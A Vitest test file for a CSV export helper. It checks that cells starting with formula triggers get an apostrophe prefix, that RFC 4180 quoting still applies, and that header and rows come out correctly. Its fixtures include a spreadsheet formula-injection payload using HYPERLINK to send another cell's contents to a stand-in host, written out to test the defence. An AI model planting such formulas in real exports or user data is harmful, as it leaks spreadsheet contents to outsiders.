import { describe, it, expect } from 'vitest';
import { escapeCsvCell, generateCSV } from '../../utils/csv';

describe('escapeCsvCell — spreadsheet formulas in user-chosen values', () => {
  it.each([
    ['=HYPERLINK("https://x.example/?"&C2,"open")'],
    ['+1+cmd'],
    ['-2+3'],
    ['@SUM(A1:A9)'],
    ['\t=1+1'],
    ['\r=1+1'],
  ])('neutralises a value starting with a trigger: %j', (value) => {
    const cell = escapeCsvCell(value);
    // Unquoted cells start with the apostrophe; quoted ones right after the quote
    const content = cell.startsWith('"') ? cell.slice(1) : cell;
    expect(content.startsWith("'")).toBe(true);
  });

  it('keeps the value itself, only prefixed', () => {
    expect(escapeCsvCell('=1+1')).toBe("'=1+1");
    expect(escapeCsvCell('-5')).toBe("'-5");
    expect(escapeCsvCell('@handle')).toBe("'@handle");
  });

  it('neutralises BEFORE quoting, so a formula with a comma or quote stays inert and well-formed', () => {
    expect(escapeCsvCell('=A1,B1')).toBe(`"'=A1,B1"`);
    expect(escapeCsvCell('=HYPERLINK("x")')).toBe(`"'=HYPERLINK(""x"")"`);
    expect(escapeCsvCell('\r=1')).toBe(`"'\r=1"`);
  });

  it('leaves ordinary values unchanged', () => {
    expect(escapeCsvCell('alice')).toBe('alice');
    expect(escapeCsvCell('alice@example.com')).toBe('alice@example.com');
    expect(escapeCsvCell('Space = fun')).toBe('Space = fun');
    expect(escapeCsvCell(42)).toBe('42');
    expect(escapeCsvCell(0)).toBe('0');
    expect(escapeCsvCell(true)).toBe('true');
    expect(escapeCsvCell('2026-10-30T00:00:00.000Z')).toBe('2026-10-30T00:00:00.000Z');
  });

  it('still applies RFC 4180 quoting to commas, quotes and line breaks', () => {
    expect(escapeCsvCell('a,b')).toBe('"a,b"');
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('writes null and undefined as empty cells', () => {
    expect(escapeCsvCell(null)).toBe('');
    expect(escapeCsvCell(undefined)).toBe('');
  });
});

describe('generateCSV', () => {
  const columns = [
    { key: 'username', label: 'Username' },
    { key: 'displayName', label: 'Display Name' },
    { key: 'email', label: 'Email' },
  ];

  it('builds a header and one CRLF-separated row per record, every column neutralised', () => {
    const csv = generateCSV(
      [
        { username: 'alice', displayName: 'Alice', email: 'alice@example.com' },
        { username: '-bob', displayName: '=HYPERLINK("https://x.example/?"&C2)', email: 'bob@example.com' },
      ],
      columns,
    );
    expect(csv.split('\r\n')).toEqual([
      'Username,Display Name,Email',
      'alice,Alice,alice@example.com',
      `'-bob,"'=HYPERLINK(""https://x.example/?""&C2)",bob@example.com`,
    ]);
  });

  it('writes only the header for an empty export', () => {
    expect(generateCSV([], columns)).toBe('Username,Display Name,Email\r\n');
  });
});
